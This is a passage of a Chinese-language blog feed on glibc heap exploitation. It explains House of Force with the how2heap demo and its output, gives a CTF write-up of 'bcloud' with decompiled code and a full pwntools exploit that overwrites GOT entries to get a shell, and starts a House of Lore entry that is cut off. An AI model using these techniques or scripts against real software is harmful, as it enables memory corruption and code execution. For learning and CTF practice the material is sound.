    <content type="html"><![CDATA[<h1 id="House-of-Force-原理"><a href="#House-of-Force-原理" class="headerlink" title="House of Force 原理"></a>House of Force 原理</h1><p>一个比较有意思的利用，也是第一次对top chunk 下手，原因在于堆管理中并没有多的检查top chunk的大小问题。</p><p>我们在有机会溢出改变top chunk size的情况下，可以将其改大（eg:-1，64位下即为0xffffffffffffffff，比较时会转化为无符号数），之后不论申请多大的chunk，经比较size之后，都不会去调用mmap去分配top chunk，但我们可以通过分配足够大小的chunk使之在main_arena中top chunk的指针变换位置，也就是说，我们可以将其分配之后的chunk到我们想要的地址（eg:got表），这样我们便可以通过控制我们可以控制的指针来任意地址写。</p><p>所以最起码需要：</p><ol><li>能够溢出至topchunk的size位</li><li>能够自由控制malloc大小</li></ol><p>使用how2heap的例子来解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc , char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;\nWelcome to the House of Force\n\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot;</span><br><span class="line">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;, bss_var);</span><br><span class="line">fprintf(stderr, &quot;Its current value is: %s\n&quot;, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nLet&apos;s allocate the first chunk, taking space from the wilderness.\n&quot;);</span><br><span class="line">intptr_t *p1 = malloc(256);</span><br><span class="line">fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\n&quot;, p1 - sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;);</span><br><span class="line">int real_size = malloc_usable_size(p1);</span><br><span class="line">fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;, real_size + sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nNow let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;);</span><br><span class="line"></span><br><span class="line">//----- VULNERABILITY ----</span><br><span class="line">intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));</span><br><span class="line">fprintf(stderr, &quot;\nThe top chunk starts at %p\n&quot;, ptr_top);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;Old size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));</span><br><span class="line">*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;</span><br><span class="line">fprintf(stderr, &quot;New size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));</span><br><span class="line">//------------------------</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span><br><span class="line">   &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span><br><span class="line">   &quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;);</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span><br><span class="line"> * new_top = old_top + nb</span><br><span class="line"> * nb = new_top - old_top</span><br><span class="line"> * req + 2sizeof(long) = new_top - old_top</span><br><span class="line"> * req = new_top - old_top - 2sizeof(long)</span><br><span class="line"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span><br><span class="line"> * req = dest - old_top - 4*sizeof(long)</span><br><span class="line"> */</span><br><span class="line">unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;</span><br><span class="line">fprintf(stderr, &quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span><br><span class="line">   &quot;we will malloc %#lx bytes.\n&quot;, bss_var, ptr_top, evil_size);</span><br><span class="line">void *new_ptr = malloc(evil_size);</span><br><span class="line">fprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;, new_ptr - sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">void* ctr_chunk = malloc(100);</span><br><span class="line">fprintf(stderr, &quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;malloc(100) =&gt; %p!\n&quot;, ctr_chunk);</span><br><span class="line">fprintf(stderr, &quot;Now, we can finally overwrite that value:\n&quot;);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;... old string: %s\n&quot;, bss_var);</span><br><span class="line">fprintf(stderr, &quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;);</span><br><span class="line">strcpy(ctr_chunk, &quot;YEAH!!!&quot;);</span><br><span class="line">fprintf(stderr, &quot;... new string: %s\n&quot;, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// some further discussion:</span><br><span class="line">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span><br><span class="line">//&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span><br><span class="line">//&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span><br><span class="line"></span><br><span class="line">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span><br><span class="line">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span><br><span class="line"></span><br><span class="line">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the House of Force</span><br><span class="line"></span><br><span class="line">The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.</span><br><span class="line">The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.</span><br><span class="line"></span><br><span class="line">In the end, we will use this to overwrite a variable at 0x602060.</span><br><span class="line">Its current value is: This is a string that we want to overwrite.</span><br><span class="line"></span><br><span class="line">Let&apos;s allocate the first chunk, taking space from the wilderness.</span><br><span class="line">The chunk of 256 bytes has been allocated at 0xd61f90.</span><br><span class="line"></span><br><span class="line">Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.</span><br><span class="line">Real size (aligned and all that jazz) of our allocated chunk is 280.</span><br><span class="line"></span><br><span class="line">Now let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk</span><br><span class="line"></span><br><span class="line">The top chunk starts at 0xd62110</span><br><span class="line"></span><br><span class="line">Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.</span><br><span class="line">Old size of top chunk 0x20ef1</span><br><span class="line">New size of top chunk 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.</span><br><span class="line">Next, we will allocate a chunk that will get us right up against the desired region (with an integer</span><br><span class="line">overflow) and will then be able to allocate a chunk right over the desired region.</span><br><span class="line"></span><br><span class="line">The value we want to write to at 0x602060, and the top chunk is at 0xd62110, so accounting for the header size,</span><br><span class="line">we will malloc 0xffffffffff89ff30 bytes.</span><br><span class="line">As expected, the new pointer is at the same place as the old top chunk: 0xd62110</span><br><span class="line"></span><br><span class="line">Now, the next chunk we overwrite will point at our target buffer.</span><br><span class="line">malloc(100) =&gt; 0x602060!</span><br><span class="line">Now, we can finally overwrite that value:</span><br><span class="line">... old string: This is a string that we want to overwrite.</span><br><span class="line">... doing strcpy overwrite with &quot;YEAH!!!&quot;...</span><br><span class="line">... new string: YEAH!!!</span><br></pre></td></tr></table></figure><p>原理可以参考：<a href="https://bbs.pediy.com/thread-222924.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222924.htm</a></p><h1 id="bcloud"><a href="#bcloud" class="headerlink" title="bcloud"></a>bcloud</h1><p>回家做的第一道，看了半天没看出来漏洞。。。name的输出函数被漏掉了。。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>刚进去要输入name</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">unsigned int get_name()</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+1Ch] [ebp-5Ch]</span><br><span class="line">  char *name_; // [esp+5Ch] [ebp-1Ch]</span><br><span class="line">  unsigned int v3; // [esp+6Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  memset(&amp;s, 0, 0x50u);</span><br><span class="line">  puts(&quot;Input your name:&quot;);</span><br><span class="line">  read_str((int)&amp;s, 0x40, &apos;\n&apos;);</span><br><span class="line">  name_ = (char *)malloc(0x40u);</span><br><span class="line">  name_ptr = (int)name_;</span><br><span class="line">  strcpy(name_, &amp;s);</span><br><span class="line">  puts_(name_);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后要输入Org &amp; Host,漏洞的主力。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned int get_org_host()</span><br><span class="line">&#123;</span><br><span class="line">  char org; // [esp+1Ch] [ebp-9Ch]</span><br><span class="line">  char *o; // [esp+5Ch] [ebp-5Ch]</span><br><span class="line">  int host; // [esp+60h] [ebp-58h]</span><br><span class="line">  char *h; // [esp+A4h] [ebp-14h]</span><br><span class="line">  unsigned int v5; // [esp+ACh] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  memset(&amp;org, 0, 0x90u);</span><br><span class="line">  puts(&quot;Org:&quot;);</span><br><span class="line">  read_str((int)&amp;org, 0x40, &apos;\n&apos;);</span><br><span class="line">  puts(&quot;Host:&quot;);</span><br><span class="line">  read_str((int)&amp;host, 0x40, &apos;\n&apos;);</span><br><span class="line">  h = (char *)malloc(0x40u);</span><br><span class="line">  o = (char *)malloc(0x40u);</span><br><span class="line">  org_ptr = (int)o;</span><br><span class="line">  host_ptr = (int)h;</span><br><span class="line">  strcpy(h, (const char *)&amp;host);</span><br><span class="line">  strcpy(o, &amp;org);                             &lt;------strcpy这里出的问题</span><br><span class="line">  puts(&quot;OKay! Enjoy:)&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进去之后就是一个创建编辑删除同步note的程序，show，syn，quit没什么用</p><p>new_note:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int new_note()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  signed int i; // [esp+18h] [ebp-10h]</span><br><span class="line">  int length; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt;= 9 &amp;&amp; ptr[i]; ++i )          //最多十个</span><br><span class="line">    ;</span><br><span class="line">  if ( i == 10 )</span><br><span class="line">    return puts(&quot;Lack of space. Upgrade your account with just $100 :)&quot;);</span><br><span class="line">  puts(&quot;Input the length of the note content:&quot;);</span><br><span class="line">  length = get_num();</span><br><span class="line">  ptr[i] = (int)malloc(length + 4);                   //大小用户定义</span><br><span class="line">  if ( !ptr[i] )</span><br><span class="line">    exit(-1);</span><br><span class="line">  len_[i] = length;</span><br><span class="line">  puts(&quot;Input the content:&quot;);</span><br><span class="line">  read_str(ptr[i], length, &apos;\n&apos;);</span><br><span class="line">  printf(&quot;Create success, the id is %d\n&quot;, i);</span><br><span class="line">  result = i;</span><br><span class="line">  syn_inuse[i] = 0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // ST1C_4</span><br><span class="line">  int i; // [esp+14h] [ebp-14h]</span><br><span class="line">  int id_ptr; // [esp+18h] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Input the id:&quot;);</span><br><span class="line">  i = get_num();</span><br><span class="line">  if ( i &lt; 0 || i &gt; 9 )</span><br><span class="line">    return puts(&quot;Invalid ID.&quot;);</span><br><span class="line">  id_ptr = ptr[i];</span><br><span class="line">  if ( !id_ptr )</span><br><span class="line">    return puts(&quot;Note has been deleted.&quot;);</span><br><span class="line">  v1 = len_[i];</span><br><span class="line">  syn_inuse[i] = 0;</span><br><span class="line">  puts(&quot;Input the new content:&quot;);</span><br><span class="line">  read_str(id_ptr, v1, &apos;\n&apos;);</span><br><span class="line">  return puts(&quot;Edit success.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [esp+18h] [ebp-10h]</span><br><span class="line">  void *ptr_; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Input the id:&quot;);</span><br><span class="line">  i = get_num();</span><br><span class="line">  if ( i &lt; 0 || i &gt; 9 )</span><br><span class="line">    return puts(&quot;Invalid ID.&quot;);</span><br><span class="line">  ptr_ = (void *)ptr[i];</span><br><span class="line">  if ( !ptr_ )</span><br><span class="line">    return puts(&quot;Note has been deleted.&quot;);</span><br><span class="line">  ptr[i] = 0;</span><br><span class="line">  len_[i] = 0;</span><br><span class="line">  free(ptr_);</span><br><span class="line">  return puts(&quot;Delete success.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>主程序看了一遍又一遍，还是没发现任何漏洞。回头看，问题出现在前面：</p><p>name是用read读取的，结尾没有’\x00’;而输出是以读取到’\x00’为止的，那么就可以泄露堆地址。<br>(ps: 大概是在strcpy到指定大小的地址时，如果写入大小与目标地址大小相同，则在后面会添加目标地址的指针。具体原因目前未明)</p><p>org &amp; host 这边的strcpy操作会自动在结尾加’\n’,结果就是在一通复制完之后，可以修改topchunk的size使之变为0xffffffff，满足houseofforce条件</p><p>之后进入程序。</p><p>计算大小将topchunk调整到bss段的len[]及ptr[]附近，欺骗程序chunk的分配。之后的思路在exp中写的很清楚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level =&apos;debug&apos;</span><br><span class="line">sh = process(&apos;./bcloud&apos;)</span><br><span class="line">elf = ELF(&apos;./bcloud&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line"></span><br><span class="line">#-----------get heap_base------------</span><br><span class="line">sh.recvuntil(&apos;Input your name:\n&apos;)</span><br><span class="line">sh.send(&apos;a&apos;*64)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*64)</span><br><span class="line">heap_base = u32(sh.recv()[:4])-8</span><br><span class="line">print &apos;heap_base: &apos;+hex(heap_base)</span><br><span class="line"></span><br><span class="line">#---------house of force----------------!!!!!!!!!!</span><br><span class="line">sh.send(&apos;b&apos;*0x40)</span><br><span class="line">#sh.recvuntil(&apos;Host:&apos;)</span><br><span class="line">sh.sendline(p32(0xffffffff))</span><br><span class="line">#b(0x8048978)</span><br><span class="line">#gdb.attach(sh)#,&apos;b&apos; *0x804895e)</span><br><span class="line"></span><br><span class="line">#------------calc malloc size----------------!!!!!!!!!!!!</span><br><span class="line">topchunk_addr = heap_base + 0xd8</span><br><span class="line">print &apos;topchunk_addr: &apos;+hex(topchunk_addr)</span><br><span class="line">len_addr  = 0x0804b0a0</span><br><span class="line">list_addr = 0x0804b120</span><br><span class="line">target_addr = len_addr - 8</span><br><span class="line">size = target_addr - topchunk_addr-4-7</span><br><span class="line">print str(size)</span><br><span class="line">#----------edit topchunk to size[i]--------------</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;option---&gt;&gt;\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">#sh.recv()</span><br><span class="line">sh.sendline(str(size-4))</span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#--------------edit ptr to got_addr---------------</span><br><span class="line"></span><br><span class="line">payload = p32(16) *3 + (list_addr-len_addr-12)*&apos;a&apos;</span><br><span class="line">payload += p32(elf.got[&apos;free&apos;]) +p32( elf.got[&apos;atoi&apos;])*2</span><br><span class="line">#+elf.got[&apos;atoi&apos;] </span><br><span class="line"></span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">#sh.recv()</span><br><span class="line">sh.sendline(&apos;1000&apos;)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#sh.recv()</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(p32(elf.plt[&apos;puts&apos;]))</span><br><span class="line"></span><br><span class="line">#---------leak atoi_addr to get system_addr-----------------</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">atoi_plt = sh.recv()[:4]</span><br><span class="line">#sh.recv()</span><br><span class="line">system_addr = u32(atoi_plt) - libc.symbols[&apos;atoi&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">print &apos;system_addr: &apos;+hex(system_addr)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#-------------edit atoi to system------------------</span><br><span class="line"></span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(p32(system_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#--------------------- get shell------------------</span><br><span class="line">sh.sendlineafter(&apos;option---&gt;&gt;&apos;, &apos;/bin/sh\x00&apos;)</span><br><span class="line">#sh.send(&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-Force-原理&quot;&gt;&lt;a href=&quot;#House-of-Force-原理&quot; class=&quot;headerlink&quot; title=&quot;House of Force 原理&quot;&gt;&lt;/a&gt;House of Force 原理&lt;/h1&gt;&lt;p&gt;一个比较有意思的利用
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn2.6-HouseOfLore</title>
    <link href="http://siriuswhiter.tk/2019/01/22/introduction-to-pwn2-6-houseoflore/"/>
    <id>http://siriuswhiter.tk/2019/01/22/introduction-to-pwn2-6-houseoflore/</id>
    <published>2019-01-22T09:33:51.000Z</published>
    <updated>2019-01-22T09:43:37.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Lore-原理"><a href="#House-of-Lore-原理" class="headerlink" title="House of Lore 原理"></a>House of Lore 原理</h1><p>看了下原理，没有太多的东西，和house of spirit的思想是一样的，只是spirit是在fastbin大小的chunk范围内伪造fake chunk，而House of Lore是small bin 与 large bin大小的chunk ， 不过后来因为large bin添加了保护措施，便无法再利用。</p><p>house of lore 相比会麻烦一点，毕竟smallbin的检查比较多，因而大部分准备都是为了能够绕过检测。</p><p>单拿例子说一下吧，有对应的练习之后再加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">struct small_chunk &#123;</span><br><span class="line">  size_t prev_size;</span><br><span class="line">  size_t size;</span><br><span class="line">  struct small_chunk *fd;</span><br><span class="line">  struct small_chunk *bk;</span><br><span class="line">  char buf[0x64];               // chunk falls in smallbin size range</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct small_chunk 